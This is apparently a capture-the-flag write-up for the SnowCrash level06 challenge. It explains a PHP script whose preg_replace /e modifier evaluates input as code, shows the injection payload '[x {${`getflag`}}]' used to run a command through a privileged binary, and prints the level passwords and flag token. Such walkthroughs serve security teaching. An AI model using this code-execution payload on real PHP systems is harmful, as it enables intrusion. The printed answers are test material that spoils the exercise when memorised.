## Level06

Login as usual with a password

```
ssh -i ~/.ssh/id_rsa.pub level05@127.0.0.1 -p 4242
viuaaale9huek52boumoomioc
```

We can see the level06.php file, so I tried to execute it first. Nothing came out but we verified that this php file worked correctly.

```
PHP Notice:  Undefined offset: 1 in /home/user/level06/level06.php on line 5
PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
level06@SnowCrash:~$ php level06.php helloWorld
PHP Notice:  Undefined offset: 2 in /home/user/level06/level06.php on line 5
PHP Warning:  file_get_contents(helloWorld): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
```

So, let's take a look at this php file step by step.

```
#!/usr/bin/php
<?php
// Define function y
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

// Define function x
function x($y, $z) {
    // Read the contents of file $y
    $a = file_get_contents($y);
    // Replace [x ...] with the result of calling function y on the captured group (\2)
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    // Replace [ with (
    $a = preg_replace("/\[/", "(", $a);
    // Replace ] with )
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

// Call function x with command line arguments
$r = x($argv[1], $argv[2]);
// Print the result
print $r;
?>

```

If we break down in to the php code,

1. Function `y($m)`:

   - Replaces dots (.) with spaces (' x ') and replaces '@' with the string 'y' in the string `$m`, then returns the result.

2. Function `x($y, $z)`: takes two inputs

   - Reads the contents of the file specified by `$y` and stores it in `$a`.
   - Uses the regular expression `/(\[x (.*)\])/e` (e: "evaluate" flag, this replacement string is treated as PHP code ) to find the pattern '[x ...]' in `$a` and calls the `y()` function to perform transformations. Here, the `e` flag allows the replacement string to be executed as PHP code. Note that this feature was deprecated in PHP 5.5.0 and completely removed in PHP 7.
   - Replaces remaining `[` and `]` characters with `(` and `)`, respectively.
   - Returns the result.

3. Variable `$r`:

   - Stores the result of the `x()` function call.

4. Output:
   - Prints the result.

The main functionality of this code is to find and transform specific patterns in a file, and then output the transformed content.

Let's take a short look on PHP.
Since, I don't know know much about php, I tried to look at the official doc.
Php also allows us to run shell commands in variable interpolations using backticks. This feature is called **Execution operator**

> https://www.php.net/manual/en/language.types.string.php

And I found something interesting as below:

```
echo "This is the value of the var named by the return value of getName(): {${getName()}}";
```

1. We want to modify the input string `[x (anything here)]` so that the second capture group in the regular expression will be replaced by `${'getflag'}`. This way, when the function `y()` is called, it will execute the command `getflag`.

2. So, our modified input string should be `[x ${'getflag'}]`. This will allow us to use variable interpolation to execute the `getflag` command within the `y()` function.

So, using these php functions specfic traits and with the help of php documentations, we can exectue command using x functions and write in to a file as below.

```
level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/getflag
level06@SnowCrash:~$ cat /tmp/getflag
[x {${`getflag`}}]
```

And we retrieved the password as below.

```
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```

<details>
  <summary> Password </summary>
  wiok45aaoguiboiki2tuin6ub
  </details>
